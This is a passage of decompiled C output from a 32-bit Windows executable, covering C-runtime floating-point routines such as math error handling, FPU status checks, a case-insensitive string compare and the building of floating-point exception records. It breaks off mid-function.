// Address range: 0x41019b - 0x4101c5
int32_t function_41019b(int32_t a1) {
    // 0x41019b
    int32_t v1; // 0x41019b
    int32_t v2 = v1 & -0x10000; // 0x41019b
    int16_t v3 = a1; // 0x41019f
    if (v3 == 639) {
        // 0x4101c3
        return v2 | a1 & 0xffff;
    }
    uint16_t v4 = v3 & 32; // 0x4101a5
    if (v4 == 0) {
        // 0x4101c3
        return v2 | (int32_t)v4;
    }
    // 0x4101ab
    int32_t v5; // 0x41019b
    uint16_t v6 = (int16_t)v5 & 32; // 0x4101ae
    int32_t result = __asm_wait() & -0x10000 | (int32_t)v6; // 0x4101b2
    if (v6 == 0) {
        // 0x4101c3
        return result;
    }
    int32_t result2 = function_410297((int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x4101b9
    return result2;
}

// Address range: 0x4101c5 - 0x4101d9
int32_t function_4101c5(void) {
    // 0x4101c5
    float80_t v1; // 0x4101c5
    return function_4101ed(v1);
}

// Address range: 0x4101d9 - 0x4101ed
int32_t function_4101d9(void) {
    // 0x4101d9
    int32_t v1; // 0x4101d9
    return v1 & 0x7ff00000;
}

// Address range: 0x4101ed - 0x41027c
int32_t function_4101ed(float80_t a1) {
    // 0x4101ed
    int32_t v1; // 0x4101ed
    if (v1 == 0x7ff00000) {
        // 0x410253
        __asm_wait();
    } else {
        int32_t v2 = v1 & -0x10000; // 0x4101f4
        if ((int16_t)(float16_t)a1 == 639) {
            // 0x410228
            return v2 | (int32_t)(int16_t)(float16_t)a1;
        }
        uint16_t v3 = (int16_t)(float16_t)a1 & 32; // 0x4101fe
        if (v3 != 0) {
            // 0x410228
            return v2 | (int32_t)v3;
        }
        // 0x410204
        int32_t v4; // 0x4101ed
        uint16_t v5 = (int16_t)v4 & 32; // 0x410207
        int32_t result = __asm_wait() & -0x10000 | (int32_t)v5; // 0x41020b
        if (v5 == 0) {
            // 0x410228
            return result;
        }
    }
    int32_t v6; // 0x4101ed
    if (v6 == 29) {
        // 0x41021e
        return function_410280((int32_t)&g266, (int32_t)&g266);
    }
    int32_t result2 = function_410297((int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x410217
    return result2;
}

// Address range: 0x410280 - 0x410297
int32_t function_410280(int32_t a1, int32_t result) {
    // 0x410280
    return result;
}

// Address range: 0x410297 - 0x4102d3
int32_t function_410297(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = a1;
    int32_t v2; // bp-36, 0x410297
    int32_t v3; // 0x410297
    int32_t v4; // 0x410297
    int32_t v5; // 0x410297
    return function_4107a6(v3, &v2, &v1, v5, v4, a2, a3);
}

// Address range: 0x4102d3 - 0x4104eb
int32_t function_4102d3(int64_t * a1, int64_t * a2, int64_t * a3, int32_t a4) {
    // 0x4102d3
    int32_t v1; // bp-48, 0x4102d3
    int32_t * v2 = &v1; // 0x4102ee
    if (g236 != 0) {
        int32_t v3 = g258; // bp-52, 0x4102f0
        DecodePointer((int32_t *)g258);
        v2 = &v3;
    }
    int32_t v4 = (int32_t)v2;
    int32_t v5; // bp-40, 0x4102d3
    if (a4 > 26) {
        // 0x410432
        switch (a4) {
            case 27: {
                // 0x410499
                v5 = 2;
                goto lab_0x4104a0;
            }
            case 28: {
                goto lab_0x410347;
            }
            case 49: {
                goto lab_0x410347;
            }
            case 58: {
                goto lab_0x410347;
            }
            case 61: {
                goto lab_0x410347;
            }
            default: {
                int32_t v6 = a4 - 1000; // 0x41044b
                if (v6 != 0 == (v6 != 1)) {
                    // 0x4104db
                    return function_4065ae();
                }
                // 0x410428
                *a3 = *a1;
                // 0x4104db
                return function_4065ae();
            }
        }
    } else {
        // 0x410311
        if (a4 == 26) {
            // 0x410428
            *a3 = 0x3ff0000000000000;
            // 0x4104db
            return function_4065ae();
        }
        if (a4 > 14) {
            if (a4 == 15) {
                goto lab_0x4103e1;
            } else {
                int32_t v7 = a4 - 24; // 0x4103cc
                if (v7 == 0) {
                    // 0x410499
                    v5 = 3;
                    goto lab_0x4104a0;
                } else {
                    if (v7 != 1) {
                        // 0x4104db
                        return function_4065ae();
                    }
                    goto lab_0x4103e1;
                }
            }
        } else {
            if (a4 == 14) {
                // 0x4103b4
                v5 = 3;
                goto lab_0x4104a0;
            } else {
                // 0x410326
                *(int32_t *)(v4 - 4) = 2;
                switch (a4) {
                    case 2: {
                        // 0x4103a5
                        v5 = 2;
                        goto lab_0x4104a0;
                    }
                    case 3: {
                        goto lab_0x410347;
                    }
                    default: {
                        int32_t v8 = a4 - 8; // 0x410332
                        if (v8 == 0) {
                            // 0x41038d
                            v5 = 2;
                            goto lab_0x4104a0;
                        } else {
                            if (v8 != 1) {
                                // 0x4104db
                                return function_4065ae();
                            }
                            goto lab_0x410347;
                        }
                    }
                }
            }
        }
    }
  lab_0x410347:;
    int32_t v9 = (int32_t)a3; // 0x41034c
    v5 = 1;
    int64_t v10 = *a3;
    *(int32_t *)(v4 - 4) = (int32_t)&v5;
    float64_t v11 = v10; // 0x410377
    int32_t v12 = v9; // 0x410377
    if (function_4065bf() == 0) {
        // 0x41037d
        *(int32_t *)function_40ab11() = 33;
        v11 = v10;
        v12 = v9;
    }
    // 0x4104d6
    *(float64_t *)v12 = v11;
    // 0x4104db
    return function_4065ae();
  lab_0x4104a0:;
    int32_t v13 = (int32_t)a3; // 0x4104a5
    int64_t v14 = *a3;
    *(int32_t *)(v4 - 4) = (int32_t)&v5;
    v11 = v14;
    v12 = v13;
    if (function_4065bf() == 0) {
        // 0x4104cb
        *(int32_t *)function_40ab11() = 34;
        v11 = v14;
        v12 = v13;
    }
    // 0x4104d6
    *(float64_t *)v12 = v11;
    // 0x4104db
    return function_4065ae();
  lab_0x4103e1:
    // 0x4103e1
    v5 = 4;
    *(int32_t *)(v4 - 4) = (int32_t)&v5;
    function_4065bf();
    // 0x4104d6
    *(float64_t *)(int32_t)a3 = (float64_t)*a3;
    // 0x4104db
    return function_4065ae();
}

// Address range: 0x4104eb - 0x4105a4
int32_t function_4104eb(int32_t a1, int32_t a2) {
    int32_t v1 = function_40f3f8(); // 0x4104ff
    int32_t v2 = a2 & 0x7ff0; // 0x410514
    float80_t v3 = (int64_t)a1;
    float80_t v4; // 0x4104eb
    float80_t v5; // 0x4104eb
    int32_t v6; // 0x4104eb
    if (v2 != 0x7ff0) {
        float80_t v7 = function_4108b1(v3, v2); // 0x410557
        uint32_t v8; // 0x4104eb
        if ((llvm_ctpop_i8((char)(v8 / 256) & 68) & 1) != 0) {
            // 0x41059e
            return function_40f3f8();
        }
        // 0x410580
        v4 = v7;
        v5 = v7;
        v6 = 16;
        if ((v1 & 32) != 0) {
            // 0x41059e
            return function_40f3f8();
        }
    } else {
        // 0x410520
        if (function_411091(v3, v2, (int32_t)&g266) < 4) {
            // 0x41059e
            return function_40f3f8();
        }
        float80_t v9 = (int64_t)a1; // 0x41053b
        v4 = v9 + 1.0L;
        v5 = v9;
        v6 = 8;
    }
    int32_t result = function_4108fb(v6, 12, v5, v4, v1, (int32_t)&g266); // 0x410596
    // 0x41059e
    return result;
}

// Address range: 0x4105b0 - 0x410611
int32_t function_4105b0(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4105b0
    if (a3 == 0) {
        // 0x41060a
        return 0;
    }
    int32_t v1 = a3; // 0x4105c9
    int32_t v2 = a1; // 0x4105c9
    int32_t v3 = a2; // 0x4105c9
    unsigned char v4 = *(char *)v2; // 0x4105cc
    char v5 = *(char *)v3; // 0x4105d0
    char v6 = v5; // 0x4105d2
    char v7 = v4; // 0x4105d2
    bool v8; // 0x4105b0
    while (v4 != 0 && v5 != 0) {
        int32_t v9 = 256 * (int32_t)v4; // 0x4105ce
        char v10 = v5 > 90 ? v5 : v5 + 32;
        int32_t v11; // 0x4105b0
        char v12 = (v4 > 90 ? v9 : v9 + (v11 & 255 | 0x2000) & 0xff00) / 256;
        if (v10 != v12) {
            // 0x410601
            v8 = v10 > v12;
            return v8 ? -1 : 1;
        }
        // 0x4105f6
        v1--;
        v2++;
        v3++;
        v6 = v10;
        v7 = v12;
        if (v1 == 0) {
            // break -> 0x4105fb
            break;
        }
        v4 = *(char *)v2;
        v5 = *(char *)v3;
        v6 = v5;
        v7 = v4;
    }
    // 0x4105fb
    v8 = v7 < v6;
    if (v7 == v6) {
        // 0x41060a
        return 0;
    }
  lab_0x410601_2:
    // 0x410601
    return v8 ? -1 : 1;
}

// Address range: 0x410611 - 0x41067b
int32_t function_410611(float80_t a1, int32_t a2, int32_t a3) {
    // 0x410611
    int32_t v1; // 0x410611
    int32_t v2; // 0x410611
    if ((function_4110ef(a1, v2, (int32_t)(float32_t)(float64_t)(int64_t)v2, v2, v1) & 144) != 0) {
        // 0x410677
        return 0;
    }
    // 0x41062b
    function_4108b1(a1, v2);
    int32_t result = 0; // 0x410646
    uint32_t v3; // 0x410611
    if ((llvm_ctpop_i8((char)(v3 / 256) & 68) & 1) != 0) {
        // 0x410648
        function_4108b1(0.5L * a1, v2);
        result = 2;
    }
    // 0x410677
    return result;
}

// Address range: 0x41067b - 0x4107a6
int32_t function_41067b(int864_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x41067b
    float80_t v1; // 0x41067b
    uint32_t v2; // 0x41067b
    if (a4 != 0x7ff00000) {
        if (a3 == 0 == a4 == -0x100000) {
            // 0x4106da
            v1 = 0.0L;
            if ((llvm_ctpop_i8((char)(v2 / 256) & 5) & 1) == 0) {
                // 0x4106f0
                v1 = (v2 & 0x4100) != 0 ? 1.0L : INFINITY;
            }
            // 0x4107a0
            *(float64_t *)a5 = (float64_t)v1;
            // 0x4107a2
            return 0;
        }
    } else {
        if (a3 == 0) {
            // 0x41069a
            v1 = INFINITY;
            if ((llvm_ctpop_i8((char)(v2 / 256) & 5) & 1) == 0) {
                // 0x4106b4
                v1 = (v2 & 0x4100) != 0 ? 1.0L : 0.0L;
            }
            // 0x4107a0
            *(float64_t *)a5 = (float64_t)v1;
            // 0x4107a2
            return 0;
        }
    }
    if (a2 == 0x7ff00000) {
        if ((int32_t)(float32_t)(float64_t)(int64_t)a1 != 0) {
            // 0x4107a2
            return 0;
        }
        // 0x410720
        v1 = INFINITY;
        if ((v2 & 0x4100) != 0) {
            // 0x410732
            v1 = (llvm_ctpop_i8((char)(v2 / 256) & 5) & 1) != 0 ? 0.0L : 1.0L;
        }
        // 0x4107a0
        *(float64_t *)a5 = (float64_t)v1;
        // 0x4107a2
        return 0;
    }
    if (a2 != -0x100000) {
        // 0x4107a2
        return 0;
    }
    if ((int32_t)(float32_t)(float64_t)(int64_t)a1 != 0) {
        // 0x4107a2
        return 0;
    }
    // 0x41074f
    int32_t v3; // 0x41067b
    int32_t v4 = function_410611((float80_t)(float64_t)(int64_t)a3, 0x7ff00000, v3); // 0x410757
    if ((v2 & 0x4100) == 0) {
        // 0x4107a0
        *(float64_t *)a5 = (float64_t)(v4 != 1 ? INFINITY : -INFINITY);
        // 0x4107a2
        return 0;
    }
    // 0x410781
    v1 = 1.0L;
    if ((llvm_ctpop_i8((char)(v2 / 256) & 5) & 1) != 0) {
        // 0x41078a
        v1 = v4 != 1 ? 0.0L : 0.0L;
    }
    // 0x4107a0
    *(float64_t *)a5 = (float64_t)v1;
    // 0x4107a2
    return 0;
}

// Address range: 0x4107a6 - 0x4108b1
int32_t function_4107a6(int32_t a1, int32_t * a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = (int32_t)a3;
    int32_t v2 = (int32_t)*(int16_t *)a4; // 0x4107d5
    int32_t v3 = v2; // bp-148, 0x4107d8
    int32_t v4 = *a3; // 0x4107de
    int32_t v5; // 0x4107a6
    int32_t v6; // 0x4107a6
    int32_t v7; // 0x4107a6
    int32_t v8; // bp-160, 0x4107a6
    int32_t v9; // bp-164, 0x4107a6
    switch (v4) {
        case 1: {
            // 0x41080e
            v9 = 8;
            v5 = 8;
            goto lab_0x410810;
        }
        case 2: {
            // 0x41080a
            v9 = 4;
            v5 = 4;
            goto lab_0x410810;
        }
        case 3: {
            // 0x410806
            v9 = 17;
            v5 = 17;
            goto lab_0x410810;
        }
        case 4: {
            // 0x410802
            v9 = 18;
            v5 = 18;
            goto lab_0x410810;
        }
        default: {
            int32_t v10 = v4 - 5; // 0x4107f4
            if (v10 == 0) {
                // 0x41080e
                v9 = 8;
                v5 = 8;
                goto lab_0x410810;
            } else {
                // 0x4107f9
                v6 = v2;
                v7 = &v8;
                if (v10 != 3) {
                    goto lab_0x410870;
                } else {
                    // 0x4107fe
                    v9 = 16;
                    v5 = 16;
                    goto lab_0x410810;
                }
            }
        }
    }
  lab_0x410810:;
    int32_t v11 = &v9;
    v9 = v2;
    int32_t v12 = v1 + 24; // 0x410812
    int32_t * v13 = (int32_t *)(v11 - 4); // 0x410815
    *v13 = v12;
    int32_t * v14 = (int32_t *)(v11 - 8); // 0x410816
    *v14 = v5;
    int32_t v15; // 0x4107a6
    int32_t v16 = function_4109c9(v9, v8, v15, v3); // 0x410817
    int32_t v17 = v11 + 4; // 0x41081c
    v6 = v3;
    v7 = v17;
    if (v16 == 0) {
        // 0x410823
        int32_t v18; // 0x4107a6
        int32_t v19 = a2 == (int32_t *)29 | a2 == (int32_t *)16 | a2 == (int32_t *)22 ? v18 & -32 | 3 : v18 & -2;
        v9 = v12;
        *v13 = v1 + 8;
        *v14 = (int32_t)a2;
        *(int32_t *)(v11 - 12) = v5;
        *(int32_t *)(v11 - 16) = (int32_t)&v3;
        int32_t v20; // bp-144, 0x4107a6
        *(int32_t *)(v11 - 20) = (int32_t)&v20;
        function_410ba9(v19, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        v6 = v3;
        v7 = v17;
    }
    goto lab_0x410870;
  lab_0x410870:;
    int32_t * v21 = (int32_t *)(v7 - 4); // 0x410870
    *v21 = 0xffff;
    *(int32_t *)(v7 - 8) = v6;
    function_40f3f8();
    if (*a3 == 8 || (char)function_40a5db() == 0) {
        // 0x410896
        *v21 = *a3;
        function_410ebd((int32_t)&g266);
        // 0x41089e
        return function_4065ae();
    }
    // 0x41088b
    *v21 = v1;
    if (function_40a608() != 0) {
        // 0x41089e
        return function_4065ae();
    }
    // 0x410896
    *v21 = *a3;
    function_410ebd((int32_t)&g266);
    // 0x41089e
    return function_4065ae();
}

// Address range: 0x4108b1 - 0x4108c7
float80_t function_4108b1(float80_t a1, int32_t a2) {
    // 0x4108b1
    return llvm_round_f80(a1);
}

// Address range: 0x4108c7 - 0x4108fb
int32_t function_4108c7(int32_t a1) {
    // 0x4108c7
    if ((a1 & 32) != 0) {
        // 0x4108db
        return 5;
    }
    // 0x4108d7
    if ((a1 & 8) != 0) {
        // 0x4108db
        return 1;
    }
    // 0x4108e0
    if ((a1 & 4) != 0) {
        // 0x4108db
        return 2;
    }
    // 0x4108e8
    if ((a1 & 1) == 0) {
        // 0x4108f1
        return 2 * a1 & 4;
    }
    // 0x4108db
    return 3;
}

// Address range: 0x4108fb - 0x4109c9
int32_t function_4108fb(int32_t a1, int32_t a2, float80_t a3, float80_t a4, int32_t a5, int32_t a6) {
    float64_t v1 = a4;
    int32_t v2 = a5;
    int32_t v3 = a6;
    int32_t v4; // 0x4108fb
    int32_t v5 = function_4109c9(a2, (int32_t)&v2, a6, v4); // 0x41092f
    v3 = a6;
    if (v5 == 0) {
        // 0x41093b
        int32_t v6; // bp-144, 0x4108fb
        function_410bcc(&v6, &v3, a2, (int32_t)(float32_t)a3, (int32_t *)&v1, &v2, v5);
    }
    int32_t v7 = function_4108c7(a2); // 0x410964
    if (v7 == 0 | (char)function_40a5db() == 0) {
        // 0x41099e
        function_410ebd(v7);
        function_40f3f8();
    } else {
        // 0x410979
        function_410eec(v7, (int32_t)(float32_t)a3, (float80_t)v1, 0.0L, (float80_t)(float64_t)(int64_t)v2, v3, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    }
    // 0x4109b6
    return function_4065ae();
}

// Address range: 0x4109c9 - 0x410ba9
int32_t function_4109c9(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x4109c9
    int32_t v1; // 0x4109c9
    float64_t v2; // 0x4109c9
    if ((a1 & 8) == 0 || (a3 & 1) == 0) {
        if ((a1 & 4 & a3) == 0) {
            uint32_t v3; // 0x4109c9
            if ((a1 & 1) == 0 || (a3 & 8) == 0) {
                // 0x410ab2
                v1 = a1 & 31;
                if ((a1 & 2) == 0 || (a3 & 16) == 0) {
                    goto lab_0x410b86;
                } else {
                    // 0x410ac5
                    if ((llvm_ctpop_i8((char)(v3 / 256) & 68) & 1) != 0) {
                        // 0x410b7b
                        function_40f424();
                        // 0x410b83
                        v1 = a1 & 29;
                        goto lab_0x410b86;
                    } else {
                        float64_t * v4 = (float64_t *)a2; // 0x410ad1
                        float64_t v5 = *v4; // 0x410ad1
                        int32_t v6; // bp-8, 0x4109c9
                        int32_t v7; // 0x4109c9
                        int32_t v8; // 0x4109c9
                        int32_t v9; // 0x4109c9
                        function_410f8e((float80_t)v5, a2, &v6, v7, v8, v9);
                        int32_t v10 = v6; // 0x410af2
                        int32_t v11 = v10 - 1536; // 0x410af8
                        v6 = v11;
                        if (v11 > -1075) {
                            int32_t v12 = (a1 & 16) != 0;
                            float64_t v13 = v5; // 0x410b36
                            int32_t v14 = v12; // 0x410b36
                            if (v11 <= 0xfffffc02) {
                                int32_t v15 = 515 - v10; // 0x410b3a
                                int32_t v16 = v12;
                                int32_t v17 = v16 + (int32_t)(v16 == 0 == (((int32_t)(float32_t)v5 & 1) != 0));
                                uint32_t v18 = (int32_t)(float32_t)v5 / 2; // 0x410b48
                                int32_t v19 = v18 | -0x80000000;
                                char v20; // 0x4109c9
                                int64_t v21 = (v20 & 1) == 0 ? (int64_t)v18 : (int64_t)v19;
                                int32_t v22 = (v20 & 1) == 0 ? v18 : v19;
                                v15--;
                                v20 /= 2;
                                v13 = v21;
                                v14 = v17;
                                while (v15 != 0) {
                                    // 0x410b3d
                                    v16 = v17;
                                    v17 = v16 + (int32_t)(v16 == 0 == (((int32_t)(float32_t)(float64_t)v21 & 1) != 0));
                                    v18 = v22 / 2;
                                    v19 = v18 | -0x80000000;
                                    v21 = (v20 & 1) == 0 ? (int64_t)v18 : (int64_t)v19;
                                    v22 = (v20 & 1) == 0 ? v18 : v19;
                                    v15--;
                                    v20 /= 2;
                                    v13 = v21;
                                    v14 = v17;
                                }
                            }
                            float80_t v23 = v13; // 0x410b63
                            *v4 = (float64_t)((v3 & 0x4100) != 0 ? v23 : -v23);
                            if (v14 == 0) {
                                // 0x410b83
                                v1 = a1 & 29;
                                goto lab_0x410b86;
                            } else {
                                // 0x410b7b
                                function_40f424();
                                // 0x410b83
                                v1 = a1 & 29;
                                goto lab_0x410b86;
                            }
                        } else {
                            // 0x410b76
                            *v4 = 0.0;
                            // 0x410b7b
                            function_40f424();
                            // 0x410b83
                            v1 = a1 & 29;
                            goto lab_0x410b86;
                        }
                    }
                }
            } else {
                // 0x410a22
                function_40f424();
                int32_t v24 = 0x1000000 * a3 / 0x1000000 & 3072; // 0x410a32
                switch (v24) {
                    case 0: {
                        // 0x410a8a
                        v2 = INFINITY;
                        if ((llvm_ctpop_i8((char)(v3 / 256) & 5) & 1) == 0) {
                            // 0x410aa6
                            v2 = -INFINITY;
                            goto lab_0x410aa8;
                        } else {
                            goto lab_0x410aa8;
                        }
                    }
                    case 1024: {
                        // 0x410a74
                        v2 = 1.7976931348623157e+308;
                        if ((llvm_ctpop_i8((char)(v3 / 256) & 5) & 1) == 0) {
                            // 0x410aa6
                            v2 = -INFINITY;
                            goto lab_0x410aa8;
                        } else {
                            goto lab_0x410aa8;
                        }
                    }
                    case 2048: {
                        // 0x410a5e
                        v2 = INFINITY;
                        if ((llvm_ctpop_i8((char)(v3 / 256) & 5) & 1) != 0) {
                            goto lab_0x410aa8;
                        } else {
                            // 0x410aa6
                            v2 = -1.7976931348623157e+308;
                            goto lab_0x410aa8;
                        }
                    }
                    default: {
                        if (v24 != 3072) {
                            // 0x410aaa
                            v1 = a1 & 30;
                            goto lab_0x410b86;
                        } else {
                            // 0x410a48
                            v2 = 1.7976931348623157e+308;
                            if ((llvm_ctpop_i8((char)(v3 / 256) & 5) & 1) != 0) {
                                goto lab_0x410aa8;
                            } else {
                                // 0x410aa6
                                v2 = -1.7976931348623157e+308;
                                goto lab_0x410aa8;
                            }
                        }
                    }
                }
            }
        } else {
            // 0x4109ff
            function_40f424();
            v1 = a1 & 27;
            goto lab_0x410b86;
        }
    } else {
        // 0x4109e6
        function_40f424();
        v1 = a1 & 23;
        goto lab_0x410b86;
    }
  lab_0x410b86:;
    int32_t v25 = v1; // 0x410b89
    if ((a1 & 16) != 0 && (a3 & 32) != 0) {
        // 0x410b91
        int32_t v26; // bp-28, 0x4109c9
        *(int32_t *)((int32_t)&v26 - 4) = 32;
        function_40f424();
        v25 = v1 & 15;
    }
    // 0x410b9c
    return v25 == 0;
  lab_0x410aa8:
    // 0x410aa8
    *(float64_t *)a2 = v2;
    // 0x410aaa
    v1 = a1 & 30;
    goto lab_0x410b86;
}

// Address range: 0x410ba9 - 0x410bcc
int32_t function_410ba9(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x410ba9
    return function_410bcc((int32_t *)a1, (int32_t *)a2, a3, a4, (int32_t *)a5, (int32_t *)a6, 0);
}

// Address range: 0x410bcc - 0x410ebd
int32_t function_410bcc(int32_t * a1, int32_t * a2, int32_t a3, int32_t a4, int32_t * a5, int32_t * a6, int32_t a7) {
    int32_t lpArguments = (int32_t)a1;
    *(int32_t *)(lpArguments + 4) = 0;
    *(int32_t *)(lpArguments + 8) = 0;
    *(int32_t *)(lpArguments + 12) = 0;
    int32_t v1 = -0x3ffffff3; // 0x410bf5
    if ((a3 & 16) != 0) {
        int32_t * v2 = (int32_t *)(lpArguments + 4); // 0x410bff
        *v2 = *v2 | 1;
        v1 = -0x3fffff71;
    }
    int32_t v3 = v1; // 0x410c05
    if ((a3 & 2) != 0) {
        int32_t * v4 = (int32_t *)(lpArguments + 4); // 0x410c0f
        *v4 = *v4 | 2;
        v3 = -0x3fffff6d;
    }
    int32_t v5 = v3; // 0x410c16
    if ((a3 & 1) != 0) {
        int32_t * v6 = (int32_t *)(lpArguments + 4); // 0x410c20
        *v6 = *v6 | 4;
        v5 = -0x3fffff6f;
    }
    int32_t v7 = v5; // 0x410c27
    if ((a3 & 4) != 0) {
        int32_t * v8 = (int32_t *)(lpArguments + 4); // 0x410c31
        *v8 = *v8 | 8;
        v7 = -0x3fffff72;
    }
    int32_t dwExceptionCode = v7; // 0x410c38
    if ((a3 & 8) != 0) {
        int32_t * v9 = (int32_t *)(lpArguments + 4); // 0x410c42
        *v9 = *v9 | 16;
        dwExceptionCode = -0x3fffff70;
    }
    int32_t * v10 = (int32_t *)(lpArguments + 8); // 0x410c54
    *v10 = (16 * *a2 & 16 | *v10 & -17) ^ 16;
    int32_t * v11 = (int32_t *)(lpArguments + 8); // 0x410c66
    *v11 = (2 * *a2 & 8 | *v11 & -9) ^ 8;
    int32_t * v12 = (int32_t *)(lpArguments + 8); // 0x410c78
    *v12 = (*a2 / 2 & 4 | *v12 & -5) ^ 4;
    int32_t * v13 = (int32_t *)(lpArguments + 8); // 0x410c8b
    *v13 = (*a2 / 8 & 2 | *v13 & -3) ^ 2;
    int32_t * v14 = (int32_t *)(lpArguments + 8); // 0x410c9e
    *v14 = (*v14 & -2 | *a2 / 32 & 1) ^ 1;
    int32_t v15; // 0x410bcc
    int32_t v16; // 0x410bcc
    int32_t v17; // 0x410bcc
    int32_t v18; // 0x410bcc
    int32_t v19 = function_40f47f(v16, v15, v18, v17); // 0x410ca6
    if ((v19 & 1) != 0) {
        int32_t * v20 = (int32_t *)(lpArguments + 12); // 0x410cb5
        *v20 = *v20 | 16;
    }
    if ((v19 & 4) != 0) {
        int32_t * v21 = (int32_t *)(lpArguments + 12); // 0x410cc1
        *v21 = *v21 | 8;
    }
    if ((v19 & 8) != 0) {
        int32_t * v22 = (int32_t *)(lpArguments + 12); // 0x410ccd
        *v22 = *v22 | 4;
    }
    if ((v19 & 16) != 0) {
        int32_t * v23 = (int32_t *)(lpArguments + 12); // 0x410cd9
        *v23 = *v23 | 2;
    }
    if ((v19 & 32) != 0) {
        int32_t * v24 = (int32_t *)(lpArguments + 12); // 0x410ce5
        *v24 = *v24 | 1;
    }
    int32_t v25 = *a2 & 3072; // 0x410cef
    int32_t * v26; // 0x410bcc
    int32_t v27; // 0x410bcc
    switch (v25) {
        case 0: {
            int32_t * v28 = (int32_t *)lpArguments; // 0x410d2b
            *v28 = *v28 & -4;
            goto lab_0x410d2e;
        }
        case 1024: {
            int32_t * v29 = (int32_t *)lpArguments;
            v26 = v29;
            v27 = *v29 & -4 | 1;
            goto lab_0x410d18;
        }
        case 2048: {
            int32_t * v30 = (int32_t *)lpArguments;
            v26 = v30;
            v27 = *v30 & -4 | 2;
            goto lab_0x410d18;
        }
        default: {
            if (v25 == 3072) {
                int32_t * v31 = (int32_t *)lpArguments; // 0x410d08
                *v31 = *v31 | 3;
            }
            goto lab_0x410d2e;
        }
    }
  lab_0x410d2e:;
    int32_t v32 = *a2 & 768; // 0x410d35
    int32_t * v33; // 0x410bcc
    int32_t v34; // 0x410bcc
    switch (v32) {
        case 0: {
            int32_t * v35 = (int32_t *)lpArguments;
            v33 = v35;
            v34 = *v35 & -29 | 8;
            goto lab_0x410d64;
        }
        case 512: {
            int32_t * v36 = (int32_t *)lpArguments;
            v33 = v36;
            v34 = *v36 & -29 | 4;
            goto lab_0x410d64;
        }
        default: {
            if (v32 == 768) {
                int32_t * v37 = (int32_t *)lpArguments; // 0x410d47
                *v37 = *v37 & -29;
            }
            goto lab_0x410d66;
        }
    }
  lab_0x410d18:
    // 0x410d18
    *v26 = v27;
    goto lab_0x410d2e;
  lab_0x410d66:;
    int32_t * v38 = (int32_t *)lpArguments; // 0x410d6f
    *v38 = *v38 & -0x1ffe1 | 32 * a4 & 0x1ffe0;
    int32_t * v39 = (int32_t *)(lpArguments + 32); // 0x410d7c
    *v39 = *v39 | 1;
    int32_t * v40 = (int32_t *)(lpArguments + 32);
    int32_t v41 = *v40 & -31;
    if (a7 == 0) {
        // 0x410db1
        *v40 = v41 | 2;
        *(float64_t *)(lpArguments + 16) = *(float64_t *)a5;
        int32_t * v42 = (int32_t *)(lpArguments + 96); // 0x410dce
        *v42 = *v42 | 1;
        int32_t * v43 = (int32_t *)(lpArguments + 96); // 0x410dd7
        *v43 = *v43 & -31 | 2;
        *(float64_t *)(lpArguments + 80) = *(float64_t *)a6;
    } else {
        // 0x410d85
        *v40 = v41;
        *(int32_t *)(lpArguments + 16) = *a5;
        int32_t * v44 = (int32_t *)(lpArguments + 96); // 0x410d9a
        *v44 = *v44 | 1;
        int32_t * v45 = (int32_t *)(lpArguments + 96); // 0x410da3
        *v45 = *v45 & -31;
        *(int32_t *)(lpArguments + 80) = *a6;
    }
    // 0x410deb
    function_40f3e5();
    RaiseException(dwExceptionCode, 0, 1, &lpArguments);
    char * v46 = (char *)(lpArguments + 8); // 0x410e02
    char v47 = *v46; // 0x410e02
    char v48 = v47; // 0x410e06
    if ((v47 & 16) != 0) {
        // 0x410e08
        *a2 = *a2 & -2;
        v48 = *v46;
    }
    char v49 = v48; // 0x410e0f
    if ((v48 & 8) != 0) {
        // 0x410e11
        *a2 = *a2 & -5;
        v49 = *v46;
    }
    char v50 = v49; // 0x410e18
    if ((v49 & 4) != 0) {
        // 0x410e1a
        *a2 = *a2 & -9;
        v50 = *v46;
    }
    char v51 = v50; // 0x410e21
    if ((v50 & 2) != 0) {
        // 0x410e23
        *a2 = *a2 & -17;
        v51 = *v46;
    }
    // 0x410e26
    if ((v51 & 1) != 0) {
        // 0x410e2c
        *a2 = *a2 & -33;
    }
    int32_t * v52 = (int32_t *)lpArguments; // 0x410e2f
    int32_t v53 = *v52 & 3; // 0x410e36
    int32_t v54; // 0x410bcc
    int32_t v55; // 0x410bcc
    switch (v53) {
        case 0: {
            int32_t v56 = *a2 & -3073; // 0x410e73
            *a2 = v56;
            v54 = v56;
            goto lab_0x410e75;
        }
        case 1: {
            // 0x410e65
            v55 = *a2 & -3073 | 1024;
            goto lab_0x410e61;
        }
        default: {
            int32_t v57 = *a2;
            if (v53 == 2) {
                // 0x410e55
                v55 = v57 & -3073 | 2048;
                goto lab_0x410e61;
            } else {
                int32_t v58 = v57 | 3072; // 0x410e4d
                *a2 = v58;
                v54 = v58;
                goto lab_0x410e75;
            }
        }
    }
  lab_0x410d64:
    // 0x410d64
    *v33 = v34;
    goto lab_0x410d66;
  lab_0x410e75:;
    int32_t v59 = *v52 / 4 & 7; // 0x410e7a
    int32_t result; // 0x410bcc
    int32_t v60; // 0x410bcc
    switch (v59) {
        case 0: {
            // 0x410e9b
            v60 = v54 & -3841 | 768;
            goto lab_0x410ea4;
        }
        case 1: {
            // 0x410e90
            v60 = v54 & -3585 | 512;
            goto lab_0x410ea4;
        }
        default: {
            int32_t v61 = v59 - 2; // 0x410e87
            result = v61;
            if (v61 == 0) {
                // 0x410e8c
                *a2 = v54 & -3073;
                result = v61;
            }
            goto lab_0x410ea6;
        }
    }
  lab_0x410e61:
    // 0x410e61
    *a2 = v55;
    v54 = v55;
    goto lab_0x410e75;
  lab_0x410ea6:
    // 0x410ea6
    if (a7 == 0) {
        // 0x410eb4
        int32_t v62; // 0x410bcc
        float64_t v63 = *(float64_t *)v62; // 0x410eb4
        *(float64_t *)a6 = v63;
    } else {
        // 0x410ead
        *a6 = *(int32_t *)(lpArguments + 80);
    }
    // 0x410eb9
    return result;
  lab_0x410ea4:
